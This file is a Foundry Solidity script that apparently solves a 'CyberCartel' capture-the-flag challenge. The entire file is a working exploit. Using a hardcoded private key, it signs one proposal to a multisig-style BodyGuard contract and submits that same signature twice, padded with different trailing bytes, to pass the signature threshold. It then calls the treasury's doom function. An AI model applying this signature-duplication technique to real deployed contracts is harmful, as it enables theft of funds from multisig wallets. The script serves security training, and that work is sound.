// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/Challenge.sol";
import "src/CyberCartel.sol";

contract Solution is Script {

    function run() external {

        uint256 privateKey = 0xa7c3cc196ea8a05f49d06121e12299fb686b7b477ec0b048e8120fb5ac86d167;

        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(0x2429A189dd3323AaD7Fc9c1E658Dd80c0ab12Fd5);

        CartelTreasury treasury = CartelTreasury(payable(challenge.TREASURY()));

        BodyGuard bodyguard = BodyGuard(treasury.bodyGuard());

        BodyGuard.Proposal memory proposal;
        proposal.expiredAt = type(uint32).max;
        proposal.gas = 150_000;
        proposal.nonce = 10;
        proposal.data = abi.encodeWithSelector(CartelTreasury.gistCartelDismiss.selector);

        bytes32 digest = keccak256(
            abi.encodePacked(proposal.expiredAt, proposal.gas, proposal.data, proposal.nonce, address(treasury), hex"80840397b652018080")
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        bytes[] memory signatures = new bytes[](2);

        signatures[1] = abi.encodePacked(r, s, v, uint256(1));
        signatures[0] = abi.encodePacked(r, s, v, uint256(2));

        bodyguard.propose(proposal, signatures);

        treasury.doom();

        vm.stopBroadcast();

    }

}